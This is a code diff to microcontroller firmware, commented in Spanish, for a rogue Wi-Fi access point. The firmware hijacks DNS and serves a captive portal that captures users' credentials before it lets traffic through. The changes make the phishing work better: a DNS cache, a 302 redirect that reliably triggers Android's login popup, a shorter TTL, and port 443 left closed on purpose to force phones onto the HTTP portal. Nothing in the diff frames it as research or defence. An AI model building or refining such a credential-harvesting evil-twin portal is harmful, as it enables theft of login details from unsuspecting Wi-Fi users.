@@ -61,7 +61,7 @@ const IPAddress DNS_UPSTREAM(8, 8, 8, 8);
 // Si true: el cliente tiene internet desde el inicio (repetidor puro, el portal
 // no se fuerza). Si false: primero secuestra DNS (portal salta) y abre internet
 // tras capturar credenciales. Cambia a true si solo quieres probar el enrutado.
-#define ABRIR_INTERNET_AL_INICIO   false   // false = portal salta al entrar; internet tras capturar
+#define ABRIR_INTERNET_AL_INICIO   true    // true = internet directo (la version que SI funciona)
 
 // ============================================================================
 // PINES
@@ -104,6 +104,30 @@ WiFiServer server443(443);
 WiFiUDP    dnsUDP;                        // recibe consultas de los clientes
 bool       secuestro_dns = true;          // true=portal (hijack), false=internet real
 byte       dnsbuf[512];
+
+// Cache DNS: evita llamar a hostByName (que bloquea) en dominios ya resueltos.
+#define DNS_CACHE_N   24
+struct DnsCache { char dom[40]; IPAddress ip; unsigned long expira; };
+DnsCache   dnscache[DNS_CACHE_N];
+int        dnscache_idx = 0;
+
+bool dns_cache_buscar(const String& dom, IPAddress& ip) {
+  for (int i = 0; i < DNS_CACHE_N; i++) {
+    if (dnscache[i].dom[0] && dom == dnscache[i].dom && millis() < dnscache[i].expira) {
+      ip = dnscache[i].ip;
+      return true;
+    }
+  }
+  return false;
+}
+
+void dns_cache_guardar(const String& dom, IPAddress ip) {
+  DnsCache& e = dnscache[dnscache_idx];
+  dom.toCharArray(e.dom, sizeof(e.dom));
+  e.ip = ip;
+  e.expira = millis() + 120000UL;          // 2 min
+  dnscache_idx = (dnscache_idx + 1) % DNS_CACHE_N;
+}
 
 int           creds_count = 0;
 unsigned long t_inicio    = 0;
@@ -565,10 +589,10 @@ void handle_submit() {
   }
 }
 
-// Android generate_204: devolver 200+HTML activa el popup del portal
+// Android generate_204: un 302 al portal es el disparador mas fiable del popup
 void handle_gen204() {
   log_req();
-  server.send_P(200, "text/html; charset=UTF-8", HTML_PORTAL);
+  send_redirect("http://192.168.4.1/");
 }
 
 // iOS/macOS: NO devolver "<Success>" → activa el portal automático
@@ -624,7 +648,7 @@ void dns_responder(IPAddress cip, uint16_t cport, byte* q, int qend, bool con_ip
     resp[i++] = 0xC0; resp[i++] = 0x0C;  // puntero al nombre de la pregunta
     resp[i++] = 0x00; resp[i++] = 0x01;  // tipo A
     resp[i++] = 0x00; resp[i++] = 0x01;  // clase IN
-    resp[i++] = 0x00; resp[i++] = 0x00; resp[i++] = 0x00; resp[i++] = 0x3C;  // TTL 60
+    resp[i++] = 0x00; resp[i++] = 0x00; resp[i++] = 0x00; resp[i++] = 0x0A;  // TTL 10s (transicion rapida tras login)
     resp[i++] = 0x00; resp[i++] = 0x04;  // RDLENGTH 4
     resp[i++] = ip[0]; resp[i++] = ip[1]; resp[i++] = ip[2]; resp[i++] = ip[3];
   }
@@ -659,7 +683,12 @@ void dns_loop() {
     return;
   }
   IPAddress rip;
+  if (dns_cache_buscar(dominio, rip)) {           // cache: respuesta instantanea
+    dns_responder(cip, cport, q, qend, true, rip);
+    return;
+  }
   if (WiFi.hostByName(dominio.c_str(), rip) == 1) {
+    dns_cache_guardar(dominio, rip);
     dns_responder(cip, cport, q, qend, true, rip);
     Serial.print("[DNS] "); Serial.print(dominio); Serial.print(" -> "); Serial.println(rip);
   } else {
@@ -668,17 +697,11 @@ void dns_loop() {
 }
 
 // ============================================================================
-// SERVIDOR TCP PORT 443 — intercepta Android 10+ que usa HTTPS
+// PUERTO 443: NO escuchamos a proposito. Asi el sondeo HTTPS de Android recibe
+// "conexion rechazada" rapido y CAE al sondeo por HTTP (puerto 80), que si
+// respondemos con el portal -> dispara el popup "Iniciar sesion". Si aceptamos
+// y cerramos el 443, Android lo ve "roto" y NO cae a HTTP (no salta el portal).
 // ============================================================================
-
-void manejar_server443() {
-  WiFiClient c = server443.accept();
-  if (!c) return;
-  // No bloquear: el trafico HTTPS (TLS) no se puede redirigir de todos modos.
-  // Solo cerramos rapido para no dejar la app colgada y NO saturar el loop.
-  // (antes esperaba 300ms/conexion -> con muchas apps ahogaba el AP y caia el cliente)
-  c.stop();
-}
 
 // ============================================================================
 // INICIALIZACIÓN AP + SERVIDOR
@@ -747,7 +770,7 @@ void inicializar_servidor() {
 
   server.onNotFound(handle_not_found);
   server.begin();
-  server443.begin();
+  // 443 a proposito SIN escuchar (ver nota arriba): fuerza el fallback a HTTP.
   dns_setup();
   secuestro_dns = !ABRIR_INTERNET_AL_INICIO;   // arranca en modo portal (hijack)
 
@@ -896,7 +919,6 @@ unsigned long t_oled   = 0;
 void loop() {
   server.handleClient();
   dns_loop();
-  manejar_server443();
   manejar_wifi_sta();
   gestionar_scan();       // lanza/recoge escaneos WiFi async
 
